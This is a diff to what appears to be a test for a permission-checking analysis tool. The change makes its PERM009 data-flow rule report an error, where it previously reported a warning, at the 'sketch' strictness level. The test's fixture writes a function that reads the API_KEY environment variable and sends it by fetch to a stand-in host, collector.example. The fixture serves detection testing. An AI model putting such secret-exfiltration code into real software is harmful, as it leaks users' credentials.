@@ -263,9 +263,10 @@ describe("data-flow rules", () => {
       path.join(dir, "my lib", "leak.ts"),
       "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
     );
+    // A rule is asked for explicitly, so it fails at every strictness level, sketch included.
     const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
-    expect(code).toBe(0);
-    expect(out).toContain("my lib/leak.ts:3:9 warning PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
+    expect(code).toBe(1);
+    expect(out).toContain("my lib/leak.ts:3:9 error PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
     expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
   });
 
